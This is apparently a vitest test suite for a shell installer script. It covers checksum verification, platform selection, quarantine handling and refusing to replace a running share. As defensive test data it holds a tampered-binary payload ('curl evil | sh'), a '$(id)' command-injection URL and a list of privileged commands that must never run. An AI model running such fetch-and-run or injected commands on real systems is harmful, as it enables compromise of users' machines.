// scripts/install.sh and scripts/release-assets.sh (SPEC R1: one command installs it). Everything is served from 127.0.0.1
// or handed over by a stand-in `curl` (https://downloads.smurg.ai answered from a local copy of the R2 bucket's layout:
// v<X.Y.Z>/ and latest/): no test reaches the network. A fake release (tiny scripts standing in for the four
// executables), a fake HOME, and stand-ins on PATH for what the installer must not really do here: `uname` (so every
// OS/arch combination runs on any host), `ldd`, `sysctl`, `id`, `xattr`; and stand-ins that only record a call for
// what it must never run at all since the guest sandbox was removed (owner decision 2026-10-01, ARCHITECTURE §11 D-15):
// `sudo`, `apt-get`, `apparmor_parser`, `tee`, `runuser`, `bwrap`. Nothing runs sudo.
import { execFile, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync } from 'node:fs';
import { chmod, mkdir, readFile, readdir, stat, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { ENV_CASES, NOT_ZH_TW_IN_ENV, NOT_ZH_TW_TAGS, ZH_TW_TAGS } from '@smurg/protocol/locale/test-table';
import { makeDirs, type Dirs } from './helpers.ts';

const INSTALL = fileURLToPath(new URL('../../../scripts/install.sh', import.meta.url));
const RELEASE_ASSETS = fileURLToPath(new URL('../../../scripts/release-assets.sh', import.meta.url));
const HOST_NAME = `smurg-${process.platform}-${process.arch === 'arm64' ? 'arm64' : 'x64'}`;
/**
 * What every stand-in for a smurg executable answers to `smurg status`: exit 3, "nothing is being shared" (the installer
 * asks the smurg it is about to replace; a stand-in that answered 0 would be a share that is running).
 */
const NOT_SHARING = 'case "${1:-}" in status) exit 3 ;; esac\n';
const BINARY = `#!/bin/sh\n${NOT_SHARING}echo "smurg 9.8.7 (fake release)"\n`;
const SYSTEM_PATH = '/usr/bin:/bin:/usr/sbin:/sbin';
/** Every shell `curl … | sh` may land in: /bin/sh (bash in sh mode on macOS, dash on Ubuntu) and dash itself. */
const SHELLS = [...new Set(['/bin/sh', '/bin/dash'].filter((shell) => existsSync(shell)))];

interface Target {
  readonly name: string;
  readonly uname: readonly [string, string];
}
const TARGETS: readonly Target[] = [
  { name: 'smurg-darwin-arm64', uname: ['Darwin', 'arm64'] },
  { name: 'smurg-darwin-x64', uname: ['Darwin', 'x86_64'] },
  { name: 'smurg-linux-x64', uname: ['Linux', 'x86_64'] },
  { name: 'smurg-linux-arm64', uname: ['Linux', 'aarch64'] },
];

/** A stand-in executable for one target: says which one it is, and logs that it ran (after the install checks). */
const fakeBinary = (name: string): string => `#!/bin/sh\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\n${NOT_SHARING}echo "smurg 9.8.7 (fake ${name})"\n`;

const cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  while (cleanups.length > 0) await Promise.resolve((cleanups.pop() as () => Promise<void> | void)()).catch(() => {});
});

interface Release {
  readonly base: string;
  readonly requests: string[];
}

async function serve(files: Record<string, string>): Promise<Release> {
  const requests: string[] = [];
  const server: Server = createServer((req, res) => {
    requests.push(req.url ?? '');
    const body = files[(req.url ?? '').replace(/^\/r1\//, '')];
    if (body === undefined) {
      res.writeHead(404).end();
      return;
    }
    res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(body);
  });
  await new Promise<void>((resolve) => server.listen({ host: '127.0.0.1', port: 0 }, resolve));
  cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
  return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}/r1`, requests };
}

interface Run {
  readonly code: number;
  readonly out: string;
}

function install(dirs: Dirs, args: readonly string[]): Promise<Run> {
  return new Promise((resolve) => {
    execFile('/bin/sh', [INSTALL, ...args], { env: { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_LANG: 'en' }, timeout: 60_000 }, (err, stdout, stderr) => {
      resolve({ code: err ? (typeof err.code === 'number' ? err.code : 1) : 0, out: `${stdout}${stderr}` });
    });
  });
}

/**
 * Runs `shell <args>` with this environment (plus SMURG_LANG=en unless `pinLang` is false), optionally feeding stdin
 * (as `curl ... | sh` does).
 */
function runShell(shell: string, args: readonly string[], env: Record<string, string>, stdin?: string, options: { readonly pinLang?: boolean } = {}): Promise<Run> {
  return new Promise((resolve, reject) => {
    // English unless the test is about the language (pinLang: false): never the developer's own locale or system.
    const child = spawn(shell, args, { env: options.pinLang === false ? env : { SMURG_LANG: 'en', ...env }, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    child.stdout.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    child.stderr.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    const timer = setTimeout(() => child.kill('SIGKILL'), 60_000);
    child.once('error', reject);
    child.once('close', (code) => {
      clearTimeout(timer);
      resolve({ code: code ?? 1, out });
    });
    // A script that ends before it read its stdin (a refused argument) closes the pipe: not an error of the test.
    child.stdin.on('error', () => undefined);
    child.stdin.end(stdin ?? '');
  });
}

const sha = (text: string): string => createHash('sha256').update(text).digest('hex');

async function setup(): Promise<Dirs> {
  const dirs = await makeDirs();
  cleanups.push(() => dirs.cleanup());
  return dirs;
}

async function writeExecutable(path: string, text: string): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, text);
  await chmod(path, 0o755);
}

/** The stand-ins the installer finds first on PATH. Each one logs its call to $FAKE_LOG. */
async function fakeTools(dir: string): Promise<string> {
  const bin = join(dir, 'fakebin');
  const log = 'echo "$(basename "$0") $*" >>"$FAKE_LOG"';
  await writeExecutable(join(bin, 'uname'), `#!/bin/sh\ncase "$1" in\n  -s) echo "$FAKE_UNAME_S" ;;\n  -m) echo "$FAKE_UNAME_M" ;;\n  *) exec /usr/bin/uname "$@" ;;\nesac\n`);
  await writeExecutable(
    join(bin, 'ldd'),
    `#!/bin/sh\nif [ "\${FAKE_MUSL:-0}" = 1 ]; then echo 'musl libc (x86_64)' >&2; echo 'Version 1.2.4' >&2; exit 1; fi\necho 'ldd (Ubuntu GLIBC 2.39-0ubuntu8) 2.39'\n`,
  );
  await writeExecutable(join(bin, 'sysctl'), `#!/bin/sh\n${log}\n[ -n "\${FAKE_TRANSLATED:-}" ] || { echo "sysctl: unknown oid '$2'" >&2; exit 1; }\necho "$FAKE_TRANSLATED"\n`);
  // Never root here unless a test says so (FAKE_UID=0), whoever runs the tests.
  await writeExecutable(join(bin, 'id'), `#!/bin/sh\n[ "$1" = -u ] && { echo "\${FAKE_UID:-1000}"; exit 0; }\nexec /usr/bin/id "$@"\n`);
  await writeExecutable(
    join(bin, 'xattr'),
    `#!/bin/sh\n${log}\ncase "$1" in\n  -p) [ "\${FAKE_QUARANTINE:-0}" = 1 ] && { echo '0081;00000000;Safari;'; exit 0; }; echo "xattr: $3: No such xattr: $2" >&2; exit 1 ;;\n  -d) exit 0 ;;\nesac\nexit 2\n`,
  );
  // What the installer must never run (there is no guest sandbox to set up): each only records the call.
  // macOS's `defaults` (the system's preferred languages): answers $FAKE_APPLE_LANGUAGES, or fails without it.
  await writeExecutable(join(bin, 'defaults'), `#!/bin/sh\n${log}\n[ -n "\${FAKE_APPLE_LANGUAGES:-}" ] || exit 1\nprintf '%s\\n' "$FAKE_APPLE_LANGUAGES"\n`);
  for (const tool of NEVER_RUN) await writeExecutable(join(bin, tool), `#!/bin/sh\necho "UNEXPECTED $(basename "$0") $*" >>"$FAKE_LOG"\nexit 99\n`);
  return bin;
}

/** The commands of the guest sandbox's setup, gone from the installer since 2026-10-01 (ARCHITECTURE §11 D-15). */
const NEVER_RUN = ['sudo', 'apt-get', 'apparmor_parser', 'tee', 'runuser', 'bwrap'] as const;

interface Faked {
  readonly dirs: Dirs;
  readonly env: Record<string, string>;
  readonly log: string;
  readonly prefix: string;
  calls(): Promise<string[]>;
}

async function faked(target: Target, extra: Record<string, string> = {}): Promise<Faked> {
  const dirs = await setup();
  const bin = await fakeTools(dirs.home);
  const log = join(dirs.home, 'calls.log');
  await writeFile(log, '');
  const tmp = join(dirs.home, 'tmp');
  await mkdir(tmp, { recursive: true });
  const env = {
    PATH: `${bin}:${SYSTEM_PATH}`,
    HOME: dirs.home,
    TMPDIR: tmp,
    SMURG_LANG: 'en',
    FAKE_LOG: log,
    FAKE_UNAME_S: target.uname[0],
    FAKE_UNAME_M: target.uname[1],
    ...extra,
  };
  return {
    dirs,
    env,
    log,
    prefix: join(dirs.home, 'opt'),
    calls: async () => (await readFile(log, 'utf8')).split('\n').filter((line) => line !== ''),
  };
}

/** A release with all four stand-in executables and their SHA256SUMS. */
const fullRelease = (overrides: Record<string, string | undefined> = {}): Record<string, string> => {
  const files: Record<string, string | undefined> = {};
  for (const target of TARGETS) files[target.name] = fakeBinary(target.name);
  files['SHA256SUMS'] = TARGETS.map((target) => `${sha(fakeBinary(target.name))}  ${target.name}\n`).join('');
  Object.assign(files, overrides);
  return Object.fromEntries(Object.entries(files).filter((entry): entry is [string, string] => entry[1] !== undefined));
};

const LINUX_X64 = TARGETS[2] as Target;
const DARWIN_ARM64 = TARGETS[0] as Target;

describe('scripts/install.sh on this machine', () => {
  it('installs the verified executable into <prefix>/bin (0755) and says how to put it on PATH', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha('other')}  smurg-linux-riscv\n${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await install(dirs, ['--base-url', release.base, '--prefix', prefix]);
    expect(result.out).toContain('smurg install: installed ');
    expect(result.code).toBe(0);
    const installed = join(prefix, 'bin', 'smurg');
    expect(await readFile(installed, 'utf8')).toBe(BINARY);
    expect((await stat(installed)).mode & 0o777).toBe(0o755);
    expect(result.out).toContain('smurg 9.8.7 (fake release)');
    expect(result.out).toContain(`export PATH="${join(prefix, 'bin')}:$PATH"`);
    // A curl download carries no quarantine attribute: nothing was removed.
    expect(result.out).not.toContain('quarantine');
    expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${HOST_NAME}`].sort());
  });

  it('refuses a file whose sha256 does not match, or that SHA256SUMS does not list: nothing is installed', async () => {
    const dirs = await setup();
    const prefix = join(dirs.home, 'opt');
    const tampered = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: `${BINARY}curl evil | sh\n` });
    const bad = await install(dirs, ['--base-url', tampered.base, '--prefix', prefix]);
    expect(bad.code).not.toBe(0);
    expect(bad.out).toContain(`the sha256 of ${HOST_NAME} does not match`);
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
    const unlisted = await serve({ SHA256SUMS: `${sha(BINARY)}  smurg-other-thing\n`, [HOST_NAME]: BINARY });
    const missing = await install(dirs, ['--base-url', unlisted.base, '--prefix', prefix]);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toContain(`SHA256SUMS does not list ${HOST_NAME}`);
    // Checked before the ~110 MiB download: the executable was never requested.
    expect(unlisted.requests).toEqual(['/r1/SHA256SUMS']);
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('refuses without a download location, or with one that is not https (http only on this machine)', async () => {
    const dirs = await setup();
    const none = await install(dirs, []);
    expect(none.code).toBe(2);
    expect(none.out).toContain('smurg install: no download location');
    const plain = await install(dirs, ['--base-url', 'http://downloads.example.invalid/smurg']);
    expect(plain.code).toBe(2);
    expect(plain.out).toContain('the download location must be an https URL');
    const odd = await install(dirs, ['--base-url', 'https://example.invalid/$(id)']);
    expect(odd.code).toBe(2);
    const unknown = await install(dirs, ['--frobnicate']);
    expect(unknown.code).toBe(2);
    expect(unknown.out).toContain('unknown argument --frobnicate');
  });

  it('works as `curl … | sh`: the script on stdin, the URL from SMURG_INSTALL_BASE_URL, the default prefix ~/.local', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, script);
      expect(result.out).toContain('smurg is installed:');
      expect(result.code).toBe(0);
      expect(await readFile(join(dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(BINARY);
    }
  });

  it('a download cut short runs nothing: every step is inside main, called on the last line', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    const lines = script.split('\n');
    const mainCall = lines.lastIndexOf('main "$@"');
    expect(mainCall).toBeGreaterThan(0);
    expect(lines.slice(mainCall + 1).join('').trim()).toBe('');
    for (const cut of [0.25, 0.5, 0.75, 0.999]) {
      const partial = script.slice(0, Math.floor(script.length * cut));
      const result = await runShell('/bin/sh', ['-s'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, partial);
      expect(result.out).not.toMatch(/downloading|installed/);
    }
    expect(release.requests).toEqual([]);
    expect(existsSync(join(dirs.home, '.local'))).toBe(false);
  });
});

describe('scripts/install.sh picks the executable of every OS / architecture (faked uname)', () => {
  for (const shell of SHELLS) {
    for (const target of TARGETS) {
      it(`${target.uname.join(' ')} → ${target.name} (${shell})`, async () => {
        const f = await faked(target);
        const release = await serve(fullRelease());
        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
        expect(result.out).toContain(`fake ${target.name}`);
        expect(result.code).toBe(0);
        expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
        expect((await stat(join(f.prefix, 'bin', 'smurg'))).mode & 0o777).toBe(0o755);
        expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${target.name}`].sort());
        const calls = await f.calls();
        if (target.uname[0] === 'Darwin') {
          // The attribute is looked for only after the checksum matched, and is absent: nothing is removed.
          expect(calls.filter((call) => call.startsWith('xattr'))).toEqual([expect.stringMatching(new RegExp(`^xattr -p com\\.apple\\.quarantine .*/${target.name}$`))]);
          expect(result.out).not.toContain('quarantine');
        } else {
          expect(calls.some((call) => call.startsWith('xattr'))).toBe(false);
        }
        expect(calls.filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
      });
    }
  }

  it('an x86_64 shell under Rosetta on Apple silicon gets the arm64 executable', async () => {
    const f = await faked(TARGETS[1] as Target, { FAKE_TRANSLATED: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-darwin-arm64'));
  });

  for (const target of TARGETS) {
    it(`refuses a tampered ${target.name} before running it or touching its attributes`, async () => {
      const f = await faked(target, { FAKE_QUARANTINE: '1' });
      const release = await serve(fullRelease({ [target.name]: `${fakeBinary(target.name)}curl evil | sh\n` }));
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(`the sha256 of ${target.name} does not match`);
      expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
      const calls = await f.calls();
      expect(calls.some((call) => call.startsWith('run ') || call.startsWith('xattr'))).toBe(false);
    });
  }

  it('a missing asset is a clear error, nothing installed: the executable of this platform, or SHA256SUMS', async () => {
    const f = await faked(TARGETS[3] as Target);
    const noBinary = await serve(fullRelease({ 'smurg-linux-arm64': undefined }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', noBinary.base, '--prefix', f.prefix], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain(`cannot download ${noBinary.base}/smurg-linux-arm64 (the release has no executable for this platform, or the network dropped); nothing was installed`);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
    const noSums = await serve(fullRelease({ SHA256SUMS: undefined }));
    const sums = await runShell('/bin/sh', [INSTALL, '--base-url', noSums.base, '--prefix', f.prefix], f.env);
    expect(sums.code).not.toBe(0);
    expect(sums.out).toContain(`cannot download ${noSums.base}/SHA256SUMS`);
    expect(noSums.requests).toEqual(['/r1/SHA256SUMS']);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });

  it('refuses an OS, an architecture or a C library it has no executable for, before downloading anything', async () => {
    const release = await serve(fullRelease());
    const cases: [Target, Record<string, string>, string][] = [
      [{ name: '-', uname: ['FreeBSD', 'amd64'] }, {}, 'this operating system is not supported: FreeBSD'],
      [{ name: '-', uname: ['Linux', 'riscv64'] }, {}, 'this processor architecture is not supported: riscv64'],
      [LINUX_X64, { FAKE_MUSL: '1' }, 'musl'],
    ];
    for (const [target, extra, message] of cases) {
      const f = await faked(target, extra);
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(message);
    }
    expect(release.requests).toEqual([]);
  });

  it('an executable that does not run here is not installed, and says why', async () => {
    const f = await faked(LINUX_X64);
    const broken = '#!/bin/sh\necho "error while loading shared libraries: libstdc++.so.6" >&2\nexit 127\n';
    const release = await serve(fullRelease({ 'smurg-linux-x64': broken, SHA256SUMS: `${sha(broken)}  smurg-linux-x64\n` }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('libstdc++.so.6');
    expect(result.out).toContain('does not run on this computer');
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });
});

describe('scripts/install.sh on macOS: com.apple.quarantine', () => {
  it('removes the attribute only after the checksum matched, and before the executable first runs', async () => {
    const f = await faked(DARWIN_ARM64, { FAKE_QUARANTINE: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    const calls = await f.calls();
    const query = calls.findIndex((call) => /^xattr -p com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const removal = calls.findIndex((call) => /^xattr -d com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const firstRun = calls.findIndex((call) => call.startsWith('run smurg-darwin-arm64'));
    expect(query).toBeGreaterThanOrEqual(0);
    expect(removal).toBeGreaterThan(query);
    expect(firstRun).toBeGreaterThan(removal);
    expect(result.out).toContain('  Removed the com.apple.quarantine attribute of the downloaded file (after its sha256 matched)\n');
  });

  it.skipIf(process.platform !== 'darwin')('with the real xattr: a quarantined download is installed without the attribute', async () => {
    const dirs = await setup();
    const bin = join(dirs.home, 'fakebin');
    // curl as usual, then the file gets the attribute a browser download would carry.
    await writeExecutable(
      join(bin, 'curl'),
      `#!/bin/sh\n/usr/bin/curl "$@" || exit $?\nout=''; prev=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; done\ncase "$out" in */smurg-darwin-*) /usr/bin/xattr -w com.apple.quarantine '0081;00000000;Safari;' "$out" ;; esac\n`,
    );
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', prefix], { PATH: `${bin}:${SYSTEM_PATH}`, HOME: dirs.home });
    expect(result.code).toBe(0);
    expect(result.out).toContain('  Removed the com.apple.quarantine attribute of the downloaded file (after its sha256 matched)\n');
    const check = await runShell('/usr/bin/xattr', ['-p', 'com.apple.quarantine', join(prefix, 'bin', 'smurg')], { PATH: SYSTEM_PATH });
    expect(check.code).not.toBe(0);
  });
});

describe('scripts/install.sh installs the executable and nothing else, on every platform (no guest sandbox since 2026-10-01)', () => {
  for (const shell of SHELLS) {
    for (const target of TARGETS) {
      it(`${target.name} (${shell}): no sudo, no system packages, no AppArmor profile, not a word about a sandbox`, async () => {
        const f = await faked(target);
        const release = await serve(fullRelease());
        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
        expect(result.code).toBe(0);
        expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
        expect((await f.calls()).filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
        expect(result.out).not.toMatch(/sandbox|bubblewrap|bwrap|socat|ripgrep|AppArmor|sudo|apt-get/i);
        expect(result.out).toContain('smurg is installed:');
        // Only the download location was contacted: SHA256SUMS and this machine's executable.
        expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${target.name}`].sort());
      });
    }
  }

  it('run as root (sudo sh install.sh) it does the same: installs into the prefix it is given and runs nothing else', async () => {
    const f = await faked(LINUX_X64, { FAKE_UID: '0', SUDO_USER: 'alice' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
    expect((await f.calls()).filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
  });

  it('--help offers the download location, the prefix and --force; the sandbox options are gone', async () => {
    const dirs = await setup();
    const help = await install(dirs, ['--help']);
    expect(help.code).toBe(0);
    expect(help.out).toContain('Usage: sh install.sh [--base-url URL] [--prefix DIR] [--force]\n');
    expect(help.out).toContain('  --force     install even while the installed smurg is sharing a workspace (without it: stop sharing first)\n');
    expect(help.out).not.toMatch(/--yes|--no-deps|sandbox|sudo/);
    for (const option of ['--yes', '--no-deps']) {
      const refused = await install(dirs, ['--base-url', 'https://downloads.smurg.ai/v9.8.7', option]);
      expect(refused.code, option).toBe(2);
      expect(refused.out, option).toContain(`unknown argument ${option}`);
    }
  });

  it('the script itself has no sandbox, sudo, apt-get or AppArmor step left', async () => {
    const script = await readFile(INSTALL, 'utf8');
    const code = script
      .split('\n')
      .filter((line) => !/^\s*#/.test(line))
      .join('\n');
    expect(code).not.toMatch(/sudo|apt-get|apparmor|bwrap|bubblewrap|socat|ripgrep|runuser|sandbox|SMURG_INSTALL_TEST_SYSROOT/i);
  });
});

describe('scripts/install.sh and a share that is running (0.5.1, DESIGN B6)', () => {
  // The installer replaced <prefix>/bin/smurg without looking (W/FOUND-U6: install.sh :260-262, read). A daemon that
  // keeps running then starts the NEW `smurg hook` / `smurg mcp` for its sessions against the OLD daemon (proof p9: a
  // hook request and three MCP tools refused between 0.4.0 and 0.5.0), and two hints of `smurg update` send people to
  // the installer. Now it asks the smurg that is installed there, as `smurg update` asks itself.

  /** A smurg installed at <prefix>/bin/smurg whose `status` ends with what `answer` (shell) says; every call is logged. */
  async function installedSmurg(f: Faked, answer: string): Promise<{ path: string; text: string }> {
    const path = join(f.prefix, 'bin', 'smurg');
    const text = `#!/bin/sh\nIFS= read -r line || true\necho "installed $* stdin=<\${line:-}>" >>"$FAKE_LOG"\n[ "\${1:-}" = status ] || exit 64\n${answer}\n`;
    await writeExecutable(path, text);
    return { path, text };
  }
  const SHARING_EN =
    'smurg install: smurg is sharing a workspace on this computer; nothing was installed. Stop sharing first (smurg stop, or Ctrl-C in the terminal that runs smurg host), then run the installer again. Replacing smurg while it shares would mix the daemon that is still running with the new smurg commands. (To install all the same, add --force: curl -fsSL https://smurg.ai/install.sh | sh -s -- --force)\n';

  for (const shell of SHELLS) {
    for (const [what, code] of [
      ['is sharing (smurg status: exit 0)', 0],
      ['says a smurg host of another version is sharing (exit 5)', 5],
    ] as const) {
      it(`${shell}: the installed smurg ${what}: stops with "stop sharing first" before anything is downloaded; the executable is the old one`, async () => {
        const f = await faked(LINUX_X64);
        const old = await installedSmurg(f, `exit ${code}`);
        const release = await serve(fullRelease());
        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
        expect(result.out).toBe(SHARING_EN);
        expect(result.code).toBe(1);
        expect(release.requests).toEqual([]);
        expect(await readFile(old.path, 'utf8')).toBe(old.text);
        expect(await readdir(join(f.prefix, 'bin'))).toEqual(['smurg']);
        // It was asked once, for its status, with nothing on its stdin.
        expect((await f.calls()).filter((call) => call.startsWith('installed'))).toEqual(['installed status stdin=<>']);
      });
    }

    it(`${shell}: nothing is being shared (exit 3): installs over the old executable, having asked before the download and again before the replace`, async () => {
      const f = await faked(LINUX_X64);
      await installedSmurg(f, 'exit 3');
      const release = await serve(fullRelease());
      const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).toBe(0);
      expect(result.out).not.toContain('sharing');
      expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
      const calls = await f.calls();
      expect(calls.filter((call) => call.startsWith('installed'))).toEqual(['installed status stdin=<>', 'installed status stdin=<>']);
      // The first question comes before the downloaded executable ever ran, the second after.
      const firstRun = calls.findIndex((call) => call.startsWith('run smurg-linux-x64'));
      expect(calls.indexOf('installed status stdin=<>')).toBeLessThan(firstRun);
      expect(calls.lastIndexOf('installed status stdin=<>')).toBeGreaterThan(firstRun);
    });
  }

  it('as `curl … | sh`: the installed smurg is asked with an empty stdin (never the script), and --force goes through `sh -s -- --force`', async () => {
    const script = await readFile(INSTALL, 'utf8');
    const release = await serve(fullRelease());
    const f = await faked(LINUX_X64);
    const old = await installedSmurg(f, 'exit 0');
    const env = { ...f.env, SMURG_INSTALL_BASE_URL: release.base };
    const refused = await runShell('/bin/sh', ['-s', '--', '--prefix', f.prefix], env, script);
    expect(refused.out).toBe(SHARING_EN);
    expect(refused.code).toBe(1);
    expect(await f.calls()).toContain('installed status stdin=<>');
    expect(await readFile(old.path, 'utf8')).toBe(old.text);
    const forced = await runShell('/bin/sh', ['-s', '--', '--prefix', f.prefix, '--force'], env, script);
    expect(forced.code).toBe(0);
    expect(forced.out).toContain('smurg is installed:');
    expect(await readFile(old.path, 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
  });

  it('--force installs while it is sharing, without running the installed smurg at all', async () => {
    const f = await faked(LINUX_X64);
    await installedSmurg(f, 'exit 0');
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--force'], f.env);
    expect(result.code).toBe(0);
    expect(result.out).not.toContain('sharing');
    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
    expect((await f.calls()).filter((call) => call.startsWith('installed'))).toEqual([]);
  });

  it('a share that starts while the download runs: refused right before the replace; the old executable stays and no temp file is left', async () => {
    const f = await faked(LINUX_X64);
    // The first question: not sharing. Every later one: sharing.
    const marker = join(f.dirs.home, 'asked-once');
    const old = await installedSmurg(f, `if [ -e '${marker}' ]; then exit 0; fi\n: >'${marker}'\nexit 3`);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(1);
    expect(result.out).toContain('smurg is sharing a workspace on this computer; nothing was installed.');
    expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', '/r1/smurg-linux-x64']);
    expect(await readFile(old.path, 'utf8')).toBe(old.text);
    expect(await readdir(join(f.prefix, 'bin'))).toEqual(['smurg']);
    expect(await readdir(join(f.dirs.home, 'tmp'))).toEqual([]);
  });

  it('an installed smurg that cannot say (it does not start, or fails) does not stop the install: one line says it could not be asked', async () => {
    for (const [answer, code] of [
      ['exit 1', '1'],
      ['exit 127', '127'],
      ['kill -9 $$', '137'],
    ] as const) {
      const f = await faked(LINUX_X64);
      await installedSmurg(f, answer);
      const release = await serve(fullRelease());
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code, answer).toBe(0);
      const line = `smurg install: the smurg installed at ${join(f.prefix, 'bin', 'smurg')} could not say whether it is sharing (smurg status ended with ${code}). If smurg host is running, stop it and start it again after this install.\n`;
      expect(result.out.split(line), answer).toHaveLength(2);
      expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
    }
    // A file there that is not executable, or a first install: nobody to ask, nothing said.
    const f = await faked(LINUX_X64);
    await mkdir(join(f.prefix, 'bin'), { recursive: true });
    await writeFile(join(f.prefix, 'bin', 'smurg'), 'not executable\n', { mode: 0o644 });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(result.out).not.toContain('could not say');
  });

  it('says it in Traditional Chinese too', async () => {
    const f = await faked(LINUX_X64, { SMURG_LANG: 'zh-TW' });
    await installedSmurg(f, 'exit 0');
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(1);
    expect(result.out).toBe(
      'smurg 安裝：smurg 正在這台電腦上分享工作區，沒有安裝。請先停止分享（smurg stop，或到執行 smurg host 的終端機按 Ctrl-C），再重新執行安裝程式。分享中換掉 smurg 的話，還在執行的 daemon 會和新版的 smurg 指令混在一起。（仍要安裝請加上 --force：curl -fsSL https://smurg.ai/install.sh | sh -s -- --force）\n',
    );
  });
});

describe('scripts/install.sh: how to put the executable on PATH', () => {
  it('names the profile of the person’s shell, and says nothing when the directory is already on PATH', async () => {
    const release = await serve(fullRelease());
    const cases: [Target, string, string][] = [
